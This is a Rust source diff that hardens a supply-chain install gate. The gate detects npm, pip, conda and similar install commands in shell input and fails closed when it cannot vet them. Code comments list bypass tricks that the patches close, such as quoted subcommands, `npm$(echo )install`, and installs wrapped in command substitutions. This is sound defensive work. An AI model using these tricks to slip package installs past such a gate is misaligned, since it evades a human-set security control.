@@ -210,7 +210,11 @@ impl Default for Config {
 fn config_candidates() -> Vec<PathBuf> {
     let mut out = Vec::new();
     if let Ok(xdg) = std::env::var("XDG_CONFIG_HOME") {
-        out.push(PathBuf::from(xdg).join("contextcrawler").join("supply-chain.toml"));
+        out.push(
+            PathBuf::from(xdg)
+                .join("contextcrawler")
+                .join("supply-chain.toml"),
+        );
     }
     if let Some(home) = dirs::home_dir() {
         out.push(home.join(".config/contextcrawler/supply-chain.toml"));
@@ -254,7 +258,7 @@ fn load_config() -> &'static Config {
 struct ParsedInstall {
     ecosystem: Ecosystem,
     /// (package_name, optional_pinned_version)
-    packages: Vec<(String, Option<String>)>,
+    packages: Vec<ParsedPackage>,
     has_editable: bool,
     /// Set when the install resolves its package set from a file the gate
     /// cannot enumerate or query: pip `-r`/`--requirement`/`-c`/`--constraint`,
@@ -262,6 +266,9 @@ struct ParsedInstall {
     /// args). The string is a short human-readable description of the source.
     unvettable: Option<String>,
 }
+
+type ParsedPackage = (String, Option<String>);
+type ParsedPackageArgs = (Vec<ParsedPackage>, bool, Option<String>);
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
 enum Ecosystem {
@@ -311,83 +318,85 @@ impl Ecosystem {
 // literal `&` / `|` / `;` inside a quoted flag value does not truncate
 // the package scan.
 lazy_static! {
-    // Backslash + line-ending + any whitespace = shell line-continuation.
+    // Backslash + line-ending + indentation = shell line-continuation.
     // Collapsed to a single space before install detection. Covers POSIX
-    // (`\n`), Windows (`\r\n`), AND legacy Mac (`\r` alone).
-    static ref LINE_CONT_RE: Regex = Regex::new(r"\\(?:\r\n|\n|\r)\s*").unwrap();
+    // (`\n`), Windows (`\r\n`), AND legacy Mac (`\r` alone). Restrict the
+    // suffix to horizontal whitespace: `\s*` also swallowed a later,
+    // unescaped newline and merged distinct shell commands (#227 round 2).
+    static ref LINE_CONT_RE: Regex = Regex::new(r"\\(?:\r\n|\n|\r)[ \t]*").unwrap();
     // Verb subcommand wrapped in `['"]?…['"]?` — closes the BLOCKER both
     // reviewers flagged on #146: `npm 'install' lodash` / `pip "install" x`
     // would otherwise bypass (regex doesn't match the quoted subcommand,
     // and the bare-install scan sees `lodash` as a package → silent skip).
     static ref NPM_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:npm)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:i|install|add)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:npm)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:i|install|add)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     static ref PNPM_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pnpm)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:i|install|add)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pnpm)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:i|install|add)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     static ref PNPM_UPDATE_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pnpm)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:update)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pnpm)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:update)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     static ref YARN_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:yarn)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:add)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:yarn)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:add)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     static ref PIP_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pip\d*(?:\.\d+)*)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:install)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pip\d*(?:\.\d+)*)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:install)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     static ref UV_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:uv)['"]?(?:\.(?i:cmd|exe|bat))*\s+(?:['"]?(?i:pip)['"]?\s+)?['"]?(?i:install|add)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:uv)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+(?:['"]?(?i:pip)['"]?[ \t]+)?['"]?(?i:install|add)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     static ref POETRY_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:poetry)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:add)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:poetry)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:add)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     static ref POETRY_UPDATE_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:poetry)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:update)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:poetry)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:update)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     static ref PIPX_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pipx)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:install)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pipx)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:install)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     // #144 — bun (JS/TS → npm registry). Subcommand set mirrors npm:
     // `bun install <pkg>`, `bun add <pkg>`, `bun i <pkg>`.
     static ref BUN_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:bun)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:i|install|add)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:bun)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:i|install|add)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     // #144 — PDM (Python → PyPI). `pdm add <pkg>` is the package-bearing
     // form; `pdm install` / `pdm sync` are bare-lockfile (handled below).
     static ref PDM_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pdm)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:add)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pdm)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:add)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     // #144 — Pipenv (Python → PyPI). `pipenv install <pkg>` is dual: bare =
     // lockfile (handled below), with a pkg = package-bearing (this regex).
     static ref PIPENV_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pipenv)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:install)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pipenv)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:install)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     // #144 — conda. Mapped to PyPI as the closest bucket, but ALWAYS surfaced
     // as unvettable (packages resolve from conda channels, not PyPI). Covers
     // `conda install <pkg>` and `conda create -n <env> <pkg>`.
     static ref CONDA_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:conda)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:install|create)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:conda)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:install|create)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     // #144 — mamba (conda drop-in). Same caveat as conda — unvettable. Covers
     // `mamba install <pkg>` AND `mamba create -n <env> <pkg>` (mirrors CONDA_RE).
     static ref MAMBA_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:mamba)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:install|create)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:mamba)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:install|create)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
     static ref BREW_RE: Regex = Regex::new(
-        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:brew)['"]?(?:\.(?i:cmd|exe|bat))*\s+['"]?(?i:install)['"]?\s+([^|;&<>\r\n]+)"#
+        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:brew)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:install)['"]?[ \t]+([^|;&<>\r\n]+)"#
     )
     .unwrap();
 }
@@ -409,19 +418,33 @@ lazy_static! {
 /// them. The substitution body still consumes its source span so subsequent
 /// tokens align on byte offsets in the *original* command.
 ///
-/// Unmatched quotes are tolerated: the unclosed run is consumed to end-of-input
-/// as a single token. The gate's fallback contract is no-panic; an unmatched
-/// quote at worst yields a noisy token that the regex pass ignores.
+/// Unmatched quotes, substitutions, and trailing escapes are errors. The
+/// caller turns an install-shaped tokenisation failure into an unvettable
+/// finding; silently returning a best-effort token stream would fail open.
 ///
 /// ANSI-C `$'…'` quotes are treated as single quotes for tokenising — we
 /// do not interpret `\n`/`\t` escapes because the gate only needs the verb
 /// surface, not the byte-perfect payload.
-fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
+fn shell_tokens(cmd: &str) -> std::result::Result<Vec<(usize, String)>, &'static str> {
     let mut out = Vec::new();
     let bytes = cmd.as_bytes();
     let mut i = 0;
     while i < bytes.len() {
         let c = bytes[i] as char;
+        // An unescaped line ending terminates a shell command. Preserve it as
+        // an operator token rather than dropping it as generic whitespace;
+        // otherwise `npm install\nnext-command` is reconstructed as one
+        // package-bearing invocation and the real lockfile install is missed.
+        if c == '\n' || c == '\r' {
+            let start = i;
+            if c == '\r' && i + 1 < bytes.len() && bytes[i + 1] == b'\n' {
+                i += 2;
+            } else {
+                i += 1;
+            }
+            out.push((start, "\n".to_string()));
+            continue;
+        }
         if c.is_whitespace() {
             i += 1;
             continue;
@@ -447,8 +470,7 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
         let mut j = i;
         while j < bytes.len() {
             let cj = bytes[j] as char;
-            if cj.is_whitespace() || cj == ';' || cj == '|' || cj == '&' || cj == '>' || cj == '<'
-            {
+            if cj.is_whitespace() || cj == ';' || cj == '|' || cj == '&' || cj == '>' || cj == '<' {
                 break;
             }
             // Single quote: literal — no expansion, no escape, ends at next `'`.
@@ -458,10 +480,11 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
                 while k < bytes.len() && (bytes[k] as char) != '\'' {
                     k += 1;
                 }
-                payload.push_str(&cmd[q_start..k.min(bytes.len())]);
-                // Step past the closing quote if present; otherwise consume
-                // to end-of-input (unmatched quote — best effort, no panic).
-                j = if k < bytes.len() { k + 1 } else { k };
+                if k == bytes.len() {
+                    return Err("unterminated single quote");
+                }
+                payload.push_str(&cmd[q_start..k]);
+                j = k + 1;
                 continue;
             }
             // ANSI-C $'…' quote: same shape as single quote for our purposes.
@@ -476,8 +499,11 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
                     }
                     k += 1;
                 }
-                payload.push_str(&cmd[q_start..k.min(bytes.len())]);
-                j = if k < bytes.len() { k + 1 } else { k };
+                if k == bytes.len() {
+                    return Err("unterminated ANSI-C quote");
+                }
+                payload.push_str(&cmd[q_start..k]);
+                j = k + 1;
                 continue;
             }
             // Double quote: no operator splitting, no expansion. `\"` is the
@@ -500,8 +526,11 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
                     }
                     k += 1;
                 }
-                payload.push_str(&cmd[q_start..k.min(bytes.len())]);
-                j = if k < bytes.len() { k + 1 } else { k };
+                if k == bytes.len() {
+                    return Err("unterminated double quote");
+                }
+                payload.push_str(&cmd[q_start..k]);
+                j = k + 1;
                 continue;
             }
             // Command substitution `$(…)`: consume balanced. The body is
@@ -511,12 +540,15 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
             if cj == '$' && j + 1 < bytes.len() && (bytes[j + 1] as char) == '(' {
                 let body_start = j + 2;
                 let k = scan_balanced_paren(cmd, body_start);
+                if k == bytes.len() {
+                    return Err("unterminated command substitution");
+                }
                 // Copy body verbatim into the payload so any package-name
                 // text that lives at the same shell-word level (e.g. an
                 // adversary writing `npm$(echo )install foo`) does not
                 // disappear from the regex pass.
-                payload.push_str(&cmd[body_start..k.min(bytes.len())]);
-                j = if k < bytes.len() { k + 1 } else { k };
+                payload.push_str(&cmd[body_start..k]);
+                j = k + 1;
                 continue;
             }
             // Backtick substitution: same role as `$(…)`, single-level only.
@@ -530,8 +562,11 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
                     }
                     k += 1;
                 }
-                payload.push_str(&cmd[body_start..k.min(bytes.len())]);
-                j = if k < bytes.len() { k + 1 } else { k };
+                if k == bytes.len() {
+                    return Err("unterminated backtick substitution");
+                }
+                payload.push_str(&cmd[body_start..k]);
+                j = k + 1;
                 continue;
             }
             // Backslash escape outside quotes: skip one char.
@@ -540,13 +575,16 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
                 j += 2;
                 continue;
             }
+            if cj == '\\' {
+                return Err("trailing backslash escape");
+            }
             payload.push(cj);
             j += 1;
         }
         out.push((start, payload));
         i = j;
     }
-    out
+    Ok(out)
 }
 
 /// Scan forward from `start` (which should point just past the opening `(`)
@@ -602,6 +640,8 @@ fn scan_balanced_paren(cmd: &str, start: usize) -> usize {
 /// command-substitution bodies `$(…)`, and backtick bodies. Returned strings
 /// are the *literal inner command text* — the caller re-runs the full
 /// install detector on each one to close the wrapped-install bypass class.
+/// A shell-tokenisation error is returned to the caller so it can emit a
+/// synthetic unvettable finding instead of silently dropping wrapper bodies.
 ///
 /// Representation choice: a flat `Vec<String>` of inner commands rather than
 /// in-band tokens. This keeps the offset/dedup contract of `shell_tokens`
@@ -609,7 +649,7 @@ fn scan_balanced_paren(cmd: &str, start: usize) -> usize {
 /// to a single explicit pass in `detect_installs`. Each segment is treated as
 /// an independent command — no offset is needed because spans in the inner
 /// command would not align with the outer claimed-span dedup anyway.
-fn extract_recursion_segments(cmd: &str) -> Vec<String> {
+fn extract_recursion_segments(cmd: &str) -> std::result::Result<Vec<String>, &'static str> {
     let mut out = Vec::new();
     let bytes = cmd.as_bytes();
     let mut i = 0;
@@ -710,7 +750,7 @@ fn extract_recursion_segments(cmd: &str) -> Vec<String> {
     // character is `c`. The next token after the matching cluster is the
     // command body. A long option (`--`) or non-option token before `-c`
     // ends the scan without recursion.
-    let toks = shell_tokens(cmd);
+    let toks = shell_tokens(cmd)?;
     let mut idx = 0;
     while idx < toks.len() {
         let head = installer_basename(toks[idx].1.as_str()).to_ascii_lowercase();
@@ -750,7 +790,7 @@ fn extract_recursion_segments(cmd: &str) -> Vec<String> {
         idx += 1;
     }
 
-    out
+    Ok(out)
 }
 
 /// Return a same-length copy of `cmd` where shell operator characters
@@ -851,7 +891,7 @@ fn mask_quoted_operators(cmd: &str) -> String {
 fn is_shell_operator(tok: &str) -> bool {
     matches!(
         tok,
-        ";" | "|" | "||" | "&" | "&&" | ">" | ">>" | "<" | "<<"
+        ";" | "|" | "||" | "&" | "&&" | ">" | ">>" | "<" | "<<" | "\n"
     )
 }
 
@@ -891,10 +931,8 @@ const DATA_CONSUMING_UTILITIES: &[&str] = &[
     // Emit-as-data
     "echo", "printf", "cat", "tac", "tee",
     // Search-as-data (grep family — no `--pre`-style executable flag)
-    "grep", "egrep", "fgrep",
-    // Slice / trim-as-data
-    "head", "tail", "nl",
-    // Encode / decode (cannot execute)
+    "grep", "egrep", "fgrep", // Slice / trim-as-data
+    "head", "tail", "nl", // Encode / decode (cannot execute)
     "base64", "xxd", "od", "hexdump",
     // Structured-text parse (jq has no shell-out; `--exec`-style flags do not exist)
     "jq",
@@ -911,7 +949,9 @@ const DATA_CONSUMING_UTILITIES: &[&str] = &[
 /// begin with a shell operator, and on any unknown head.
 #[allow(dead_code)] // exercised by tests + reserved for principled-path follow-up
 fn command_head_is_data_utility(segment: &str) -> bool {
-    let tokens = shell_tokens(segment);
+    let Ok(tokens) = shell_tokens(segment) else {
+        return false;
+    };
     let head = match tokens.first() {
         Some((_, t)) => t.as_str(),
         None => return false,
@@ -944,7 +984,11 @@ fn command_head_is_data_utility(segment: &str) -> bool {
 /// token payloads (so `tok.len()` no longer equals the source-span length
 /// for a quoted token).
 fn mask_data_utility_segments(cmd: &str) -> String {
-    let tokens = shell_tokens(cmd);
+    let Ok(tokens) = shell_tokens(cmd) else {
+        // Do not suppress any surface when shell structure is ambiguous.
+        // The token-first detector will emit the fail-closed finding.
+        return cmd.to_string();
+    };
     let bytes = cmd.as_bytes();
     let mut out: Vec<u8> = bytes.to_vec();
 
@@ -1011,6 +1055,7 @@ fn mask_data_utility_segments(cmd: &str) -> String {
 /// - `uv install <pkg>` / `uv add <pkg>` / `uv pip install <pkg>`
 /// - `poetry add <pkg>`
 /// - `pipx install <pkg>`
+/// - `npx <pkg>` / `pnpx <pkg>` / `yarn dlx <pkg>` (local-only fail-closed)
 /// - local-classification / fail-closed additions from lab #144:
 ///   `bun install|add|i <pkg>`, `pdm add <pkg>`, `pipenv install <pkg>`,
 ///   `conda install|create ...`, `mamba install|create ...`,
@@ -1126,46 +1171,49 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
     // Map of start-byte → end-byte for claimed spans, sorted by start.
     // O(log n) overlap-check via `range(..=start).next_back()` — was a
     // linear scan (`claimed.iter().any(...)`) before #149.
-    let mut claimed: std::collections::BTreeMap<usize, usize> =
-        std::collections::BTreeMap::new();
+    let mut claimed: std::collections::BTreeMap<usize, usize> = std::collections::BTreeMap::new();
 
-    // Each entry: (regex, ecosystem, local_only_caveat). `Some(msg)` means
+    // Each entry: (regex, manager, ecosystem, local_only_caveat). `Some(msg)` means
     // detection is local-only and must fail closed to Ask without registry/OSV
     // calls. This preserves lab #144's expanded install detection while
     // honouring the updated direction not to add cloud API dependencies where
     // local Mongo/package intelligence would be needed. `None` keeps the
     // existing first-class npm/PyPI behaviour.
-    let ordered: [(&Regex, Ecosystem, Option<&'static str>); 15] = [
-        (&*UV_RE, Ecosystem::Pypi, None),
-        (&*NPM_RE, Ecosystem::Npm, None),
-        (&*PNPM_RE, Ecosystem::Npm, None),
+    let ordered: [(&Regex, &str, Ecosystem, Option<&'static str>); 15] = [
+        (&*UV_RE, "uv", Ecosystem::Pypi, None),
+        (&*NPM_RE, "npm", Ecosystem::Npm, None),
+        (&*PNPM_RE, "pnpm", Ecosystem::Npm, None),
         (
             &*PNPM_UPDATE_RE,
+            "pnpm",
             Ecosystem::Npm,
             Some(
                 "pnpm update package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
             ),
         ),
-        (&*YARN_RE, Ecosystem::Npm, None),
+        (&*YARN_RE, "yarn", Ecosystem::Npm, None),
         (
             &*BUN_RE,
+            "bun",
             Ecosystem::Npm,
             Some(
                 "bun install package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
             ),
         ),
-        (&*PIP_RE, Ecosystem::Pypi, None),
-        (&*POETRY_RE, Ecosystem::Pypi, None),
+        (&*PIP_RE, "pip", Ecosystem::Pypi, None),
+        (&*POETRY_RE, "poetry", Ecosystem::Pypi, None),
         (
             &*POETRY_UPDATE_RE,
+            "poetry",
             Ecosystem::Pypi,
             Some(
                 "poetry update package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
             ),
         ),
-        (&*PIPX_RE, Ecosystem::Pypi, None),
+        (&*PIPX_RE, "pipx", Ecosystem::Pypi, None),
         (
             &*PDM_RE,
+            "pdm",
             Ecosystem::Pypi,
             Some(
                 "pdm package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
@@ -1173,6 +1221,7 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
         ),
         (
             &*PIPENV_RE,
+            "pipenv",
             Ecosystem::Pypi,
             Some(
                 "pipenv package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
@@ -1180,6 +1229,7 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
         ),
         (
             &*CONDA_RE,
+            "conda",
             Ecosystem::Pypi,
             Some(
                 "conda resolves from conda channels; not vettable against PyPI — review manually",
@@ -1187,6 +1237,7 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
         ),
         (
             &*MAMBA_RE,
+            "mamba",
             Ecosystem::Pypi,
             Some(
                 "mamba resolves from conda channels; not vettable against PyPI — review manually",
@@ -1194,6 +1245,7 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
         ),
         (
             &*BREW_RE,
+            "brew",
             Ecosystem::Unknown,
             Some(
                 "brew packages require Homebrew/local package intelligence; not vettable by this gate yet",
@@ -1209,14 +1261,11 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
     // arg-text from `cmd` itself (preserving the original characters).
     let masked = mask_quoted_operators(cmd);
 
-    for (re, eco, local_only_caveat) in ordered {
+    for (re, manager, eco, local_only_caveat) in ordered {
         for m in re.find_iter(&masked) {
             let (start, end) = (m.start(), m.end());
             // Skip if any earlier (higher-priority) pattern already claimed this span.
-            if claimed
-                .iter()
-                .any(|(s, e)| start >= *s && start < *e)
-            {
+            if claimed.iter().any(|(s, e)| start >= *s && start < *e) {
                 continue;
             }
             claimed.insert(start, end);
@@ -1228,11 +1277,8 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
             // package names carry their real (unmasked) characters. The
             // masking only ever rewrites bytes inside quoted regions to
             // spaces, so the offsets are identical in both strings.
-            let arg_string = cap
-                .get(1)
-                .map(|m| &cmd[m.start()..m.end()])
-                .unwrap_or("");
-            let (pkgs, has_editable, lockfile_source) = parse_package_args(arg_string);
+            let arg_string = cap.get(1).map(|m| &cmd[m.start()..m.end()]).unwrap_or("");
+            let (mut pkgs, has_editable, lockfile_source) = parse_package_args(arg_string, manager);
             // Local-only added surfaces: package names may parse, but without
             // the repo's requested Mongo/local-model package-intelligence path
             // we must not query remote registries/OSV. Drop parsed packages so
@@ -1245,6 +1291,12 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
                     unvettable: Some(caveat.to_string()),
                 });
                 continue;
+            }
+            if lockfile_source.is_some() {
+                // A source/config caveat describes the install as one
+                // unvettable unit. Retaining separately parsed names creates
+                // a hybrid that downstream code can mistake for vettable.
+                pkgs.clear();
             }
             // An install verb was detected. If no package is nameable AND no
             // editable token is present, the install set is unvettable
@@ -1268,6 +1320,11 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
         }
     }
 
+    // Raw regex is deliberately retained for the established fast path, but
+    // shell words are authoritative for quote concatenation and option
+    // placement. This fallback only claims spans the regex pass did not.
+    detect_tokenised_installs(cmd, &mut claimed, out);
+
     // Bare lockfile installs (`npm install` / `npm ci` / `pnpm install` /
     // `yarn install` / `yarn` with no package args) never match the
     // package-bearing regexes above. They are classified from the parsed
@@ -1289,14 +1346,48 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
     // then auto-allow at the gate. The fix: at the cap, if there are still
     // unresolved recursion segments, surface a synthetic Unvettable
     // ParsedInstall so the caller fails CLOSED (Verdict::Ask) instead.
+    let recursion_segments = match extract_recursion_segments(cmd_raw) {
+        Ok(segments) => segments,
+        Err(error) => {
+            out.push(ParsedInstall {
+                ecosystem: Ecosystem::Unknown,
+                packages: Vec::new(),
+                has_editable: false,
+                unvettable: Some(format!(
+                    "recursion segment tokenisation failed ({error}); nested shell payloads cannot be vetted"
+                )),
+            });
+            Vec::new()
+        }
+    };
+    let process_segments = match crate::discover::lexer::extract_process_substitutions(cmd_raw) {
+        Ok(segments) => segments,
+        Err(()) => {
+            out.push(ParsedInstall {
+                ecosystem: Ecosystem::Unknown,
+                packages: Vec::new(),
+                has_editable: false,
+                unvettable: Some(
+                    "malformed or over-limit process substitution cannot be vetted".to_string(),
+                ),
+            });
+            Vec::new()
+        }
+    };
+    let has_process_segments = !process_segments.is_empty();
+
     if depth < MAX_RECURSION_DEPTH {
         // Recurse against the original (unmasked) cmd: a substitution body
         // nested inside a data-utility segment still executes at runtime
         // (`echo "$(npm install foo)"`) and must be vetted.
-        for inner in extract_recursion_segments(cmd_raw) {
+        for inner in recursion_segments.into_iter().chain(
+            process_segments
+                .into_iter()
+                .map(|substitution| substitution.inner),
+        ) {
             detect_installs_into(&inner, depth + 1, out);
         }
-    } else if !extract_recursion_segments(cmd_raw).is_empty() {
+    } else if !recursion_segments.is_empty() || has_process_segments {
         out.push(ParsedInstall {
             ecosystem: Ecosystem::Unknown, // #147 — was hardcoded Npm; relabel
             packages: Vec::new(),
@@ -1333,10 +1424,12 @@ fn installer_basename(tok: &str) -> &str {
     loop {
         let mut stripped = false;
         for suffix in [".cmd", ".exe", ".bat"] {
-            if base.len() >= suffix.len()
-                && base[base.len() - suffix.len()..].eq_ignore_ascii_case(suffix)
-            {
-                base = &base[..base.len() - suffix.len()];
+            // ASCII case folding preserves byte offsets. `strip_suffix` on
+            // the folded copy establishes a valid UTF-8 boundary before the
+            // original is sliced (unlike `len() - 4` on an arbitrary token).
+            let folded = base.to_ascii_lowercase();
+            if let Some(prefix) = folded.strip_suffix(suffix) {
+                base = &base[..prefix.len()];
                 stripped = true;
                 break;
             }
@@ -1346,6 +1439,642 @@ fn installer_basename(tok: &str) -> &str {
         }
     }
     base
+}
+
+#[derive(Clone, Copy)]
+struct TokenInstallSpec {
+    verb_end_idx: usize,
+    ecosystem: Ecosystem,
+    accepts_packages: bool,
+    local_only_caveat: Option<&'static str>,
+}
+
+const PACKAGE_LAUNCHER_CAVEAT: &str =
+    "npx/dlx pulls arbitrary packages; not vettable by this gate yet";
+const PNPM_LOCKFILE_CAVEAT: &str =
+    "pnpm lockfile installs resolve from pnpm-lock.yaml; not vettable by this gate yet";
+
+fn normalised_manager(token: &str) -> Option<String> {
+    let manager = installer_basename(token).to_ascii_lowercase();
+    let pip_suffix = manager.strip_prefix("pip");
+    if pip_suffix.is_some_and(|suffix| {
+        suffix.is_empty()
+            || suffix
+                .split('.')
+                .all(|part| !part.is_empty() && part.chars().all(|c| c.is_ascii_digit()))
+    }) {
+        return Some("pip".to_string());
+    }
+    matches!(
+        manager.as_str(),
+        "npm"
+            | "npx"
+            | "pnpm"
+            | "pnpx"
+            | "yarn"
+            | "bun"
+            | "uv"
+            | "poetry"
+            | "pipx"
+            | "pdm"
+            | "pipenv"
+            | "conda"
+            | "mamba"
+            | "brew"
+    )
+    .then_some(manager)
+}
+
+fn manager_option_takes_value(manager: &str, flag: &str) -> bool {
+    match manager {
+        "npm" => matches!(
+            flag,
+            "--prefix"
+                | "-C"
+                | "--cache"
+                | "--userconfig"
+                | "--globalconfig"
+                | "--registry"
+                | "--scope"
+                | "--workspace"
+                | "-w"
+                | "--loglevel"
+        ),
+        "pnpm" => matches!(
+            flag,
+            "--dir"
+                | "-C"
+                | "--registry"
+                | "--global-dir"
+                | "--store-dir"
+                | "--config-dir"
+                | "--virtual-store-dir"
+                | "--filter"
+                | "-F"
+                | "--workspace-dir"
+        ),
+        "yarn" => matches!(
+            flag,
+            "--cwd"
+                | "--registry"
+                | "--use-yarnrc"
+                | "--mutex"
+                | "--cache-folder"
+                | "--preferred-cache-folder"
+                | "--modules-folder"
+                | "--link-folder"
+                | "--global-folder"
+        ),
+        "bun" => matches!(flag, "--cwd" | "--config" | "--backend" | "--registry"),
+        "pip" => matches!(
+            flag,
+            "--python"
+                | "--log"
+                | "--keyring-provider"
+                | "--proxy"
+                | "--retries"
